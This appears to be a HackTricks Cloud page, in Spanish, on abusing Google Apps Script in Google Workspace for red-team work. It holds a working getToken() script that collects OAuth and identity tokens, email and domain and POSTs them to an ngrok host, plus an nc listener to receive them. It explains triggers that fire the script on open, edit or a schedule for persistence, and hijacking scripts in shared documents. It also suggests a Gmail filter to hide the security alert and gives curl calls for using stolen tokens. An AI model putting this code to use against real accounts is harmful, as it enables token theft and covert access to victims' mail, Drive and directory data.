# GWS - Scripts de Aplicaciones

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Scripts de Aplicaciones

Los Scripts de Aplicaciones son **c√≥digo que se activar√° cuando un usuario con permiso de editor acceda al documento con el que el Script de Aplicaci√≥n est√° vinculado** y despu√©s de **aceptar el aviso de OAuth**.\
Tambi√©n se pueden configurar para que se **ejecuten cada cierto tiempo** por el propietario del Script de Aplicaci√≥n (Persistencia).

### Crear Script de Aplicaci√≥n

Existen varias formas de crear un Script de Aplicaci√≥n, aunque las m√°s comunes son **desde un Documento de Google (de cualquier tipo)** y como un **proyecto independiente**:

<details>

<summary>Crear un proyecto vinculado al contenedor desde Documentos de Google, Hojas de C√°lculo o Presentaciones</summary>

1. Abre un documento de Docs, una hoja de c√°lculo de Sheets o una presentaci√≥n de Slides.
2. Haz clic en **Extensiones** > **Google Apps Script**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente</summary>

Para crear un proyecto independiente desde Apps Script:

1. Ve a [`script.google.com`](https://script.google.com/).
2. Haz clic en **Nuevo Proyecto**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente desde Google Drive</summary>

1. Abre [Google Drive](https://drive.google.com/).
2. Haz clic en **Nuevo** > **M√°s** > **Google Apps Script**.

</details>

<details>

<summary>Crear un proyecto vinculado al contenedor desde Formularios de Google</summary>

1. Abre un formulario en Google Forms.
2. Haz clic en M√°s more\_vert > **Editor de scripts**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente usando la herramienta de l√≠nea de comandos clasp</summary>

`clasp` es una herramienta de l√≠nea de comandos que te permite crear, extraer/push y desplegar proyectos de Apps Script desde una terminal.

Consulta la [Gu√≠a de Interfaz de L√≠nea de Comandos usando `clasp`](https://developers.google.com/apps-script/guides/clasp) para m√°s detalles.

</details>

## Escenario de Script de Aplicaci√≥n <a href="#create-using-clasp" id="create-using-clasp"></a>

### Crear Hoja de C√°lculo de Google con Script de Aplicaci√≥n

Comienza creando un Script de Aplicaci√≥n, mi recomendaci√≥n para este escenario es crear una Hoja de C√°lculo de Google e ir a **`Extensiones > Scripts de Aplicaciones`**, esto abrir√° un **nuevo Script de Aplicaci√≥n vinculado a la hoja**.

### Fuga de token

Para dar acceso al token de OAuth necesitas hacer clic en **`Servicios +` y agregar √°mbitos como**:

* **AdminDirectory**: Acceder a usuarios y grupos del directorio (si el usuario tiene suficientes permisos)
* **Gmail**: Para acceder a datos de Gmail
* **Drive**: Para acceder a datos de Drive
* **Google Sheets API**: Para que funcione con el disparador

Para cambiar t√∫ mismo los **√°mbitos necesarios** puedes ir a la configuraci√≥n del proyecto y habilitar: **`Mostrar archivo de manifiesto "appsscript.json" en el editor`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Para capturar la solicitud, simplemente puedes ejecutar:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### Permisos solicitados para ejecutar el App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Al realizar una solicitud externa, el cuadro de di√°logo de OAuth tambi√©n **pedir√° permiso para acceder a puntos finales externos**.
{% endhint %}

### Crear Desencadenador

Una vez que se haya le√≠do la aplicaci√≥n, haga clic en **‚è∞ Desencadenadores** para crear un desencadenador. En **funci√≥n** a ejecutar, elija **`getToken`**, se ejecuta en la implementaci√≥n **`Head`**, en la fuente del evento seleccione **`Desde la hoja de c√°lculo`** y seleccione el tipo de evento **`Al abrir`** o **`Al editar`** (seg√∫n sus necesidades) y guarde.

Tenga en cuenta que puede verificar las **ejecuciones de los App Scripts en la pesta√±a Ejecuciones** si desea depurar algo.

### Compartir

Para **activar** el **App Script**, la v√≠ctima necesita conectarse con **Acceso de editor**.

{% hint style="success" %}
El **token** utilizado para ejecutar el **App Script** ser√° el del **creador del desencadenador**, incluso si el archivo se abre como Editor por otros usuarios.
{% endhint %}

### Abusar de documentos Compartidos conmigo

{% hint style="danger" %}
Si alguien **comparte contigo un documento con App Scripts y un desencadenador que utiliza el Head** del App Script (no una implementaci√≥n fija), puedes modificar el c√≥digo del App Script (agregando, por ejemplo, funciones para robar tokens), acceder a √©l y el **App Script se ejecutar√° con los permisos del usuario que comparti√≥ el documento contigo** (ten en cuenta que el token de OAuth del propietario tendr√° como alcance de acceso los otorgados cuando se cre√≥ el desencadenador).

Se enviar√° una **notificaci√≥n al creador del script indicando que alguien modific√≥ el script** (¬øQu√© tal usar permisos de gmail para generar un filtro que evite la alerta?)
{% endhint %}

{% hint style="success" %}
Si un **atacante modifica los alcances del App Script**, las actualizaciones **no se aplicar√°n** al documento hasta que se cree un **nuevo desencadenador** con los cambios. Por lo tanto, un atacante no podr√° robar el token del creador con m√°s alcances de los que estableci√≥ en el desencadenador que cre√≥.
{% endhint %}

### Copiar en lugar de compartir

Cuando creas un enlace para compartir un documento se crea un enlace similar a este: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Si **cambias** el final **"/edit"** por **"/copy"**, en lugar de acceder, Google te preguntar√° si deseas **generar una copia del documento:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Si el usuario lo copia y lo accede, tanto **el contenido del documento como los App Scripts se copiar√°n**, sin embargo, los **desencadenadores no lo har√°n**, por lo tanto **nada se ejecutar√°**.

### Compartir como Aplicaci√≥n Web

Ten en cuenta que tambi√©n es posible **compartir un App Script como una aplicaci√≥n web** (en el Editor del App Script, implementar como una aplicaci√≥n web), pero aparecer√° una alerta como esta:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Seguido por el **cuadro de di√°logo de OAuth t√≠pico** pidiendo los permisos necesarios.

### Pruebas

Puedes probar un token recopilado para listar correos electr√≥nicos con:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista de calendario del usuario:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Script de aplicaci√≥n como Persistencia

Una opci√≥n para la persistencia ser√≠a **crear un documento y agregar un desencadenador para la funci√≥n getToken** y compartir el documento con el atacante para que cada vez que el atacante abra el archivo, **extraiga el token de la v√≠ctima**.

Tambi√©n es posible crear un Script de aplicaci√≥n y hacer que se active cada cierto tiempo (como cada minuto, hora, d√≠a...). Un atacante que haya **comprometido credenciales o una sesi√≥n de una v√≠ctima podr√≠a configurar un desencadenador de tiempo en un Script de aplicaci√≥n y filtrar un token OAuth muy privilegiado cada d√≠a**:

Simplemente crea un Script de aplicaci√≥n, ve a Desencadenadores, haz clic en Agregar desencadenador y selecciona como fuente de evento Programado y elige las opciones que mejor se adapten a ti:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Esto crear√° un correo electr√≥nico de alerta de seguridad y un mensaje push a tu m√≥vil alertando sobre esto.
{% endhint %}

### Bypass de Confirmaci√≥n no Verificada de Documento Compartido

Adem√°s, si alguien te **comparti√≥** un documento con **acceso de editor**, puedes generar **Scripts de aplicaci√≥n dentro del documento** y el **PROPIETARIO (creador) del documento ser√° el propietario del Script de aplicaci√≥n**.

{% hint style="warning" %}
Esto significa que el **creador del documento aparecer√° como creador de cualquier Script de aplicaci√≥n** que cualquier persona con acceso de editor cree dentro de √©l.

Esto tambi√©n significa que el **Script de aplicaci√≥n ser√° confiable para el entorno de Workspace** del creador del documento.
{% endhint %}

{% hint style="danger" %}
Esto tambi√©n significa que si un **Script de aplicaci√≥n ya exist√≠a** y las personas han **concedido acceso**, cualquier persona con permiso de **Editor** en el documento puede **modificarlo y abusar de ese acceso**.\
Para abusar de esto tambi√©n necesitas que las personas activen el Script de aplicaci√≥n. Y un truco ingenioso es **publicar el script como una aplicaci√≥n web**. Cuando las **personas** que ya han **concedido acceso** al Script de aplicaci√≥n accedan a la p√°gina web, activar√°n el Script de aplicaci√≥n (esto tambi√©n funciona usando etiquetas `<img>`).
{% endhint %}
